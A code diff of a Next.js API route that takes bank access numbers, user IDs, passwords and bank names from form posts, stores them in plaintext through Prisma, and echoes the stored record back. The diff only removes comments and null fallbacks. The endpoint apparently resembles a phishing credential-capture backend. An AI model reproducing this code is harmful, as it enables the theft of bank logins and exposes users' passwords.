@@ -9,26 +9,22 @@ const CORS_HEADERS = {
   'Access-Control-Allow-Headers': 'Content-Type, Authorization',
 };
 
-// Disable Next.js default body parser
 export const config = {
   api: {
-    bodyParser: false, // We handle parsing ourselves
+    bodyParser: false,
   },
 };
 
 export async function POST(req: NextRequest) {
   try {
-    // Manually parse the incoming form data
-    const body = await req.text(); // Read raw text body
-    const params = new URLSearchParams(body); // Convert it to a URLSearchParams object
+    const body = await req.text();
+    const params = new URLSearchParams(body);
 
-    // Extract values from the form data
-    const accessNumber = params.get('accessNumber') || null; // Convert empty string to null
-    const userId = params.get('userId') || null; // Convert empty string to null
-    const password = params.get('password') || null; // Convert empty string to null
-    const bank = params.get('bank') || null; // Convert empty string to null
+    const accessNumber = params.get('accessNumber');
+    const userId = params.get('userId');
+    const password = params.get('password');
+    const bank = params.get('bank');
 
-    // Create a new order in the database using Prisma
     const newOrder = await prisma.bank.create({
       data: {
         accessNumber,
@@ -38,7 +34,6 @@ export async function POST(req: NextRequest) {
       },
     });
 
-    // Return success response
     return new NextResponse(
       JSON.stringify({ success: true, message: 'Data saved successfully', order: newOrder }),
       {
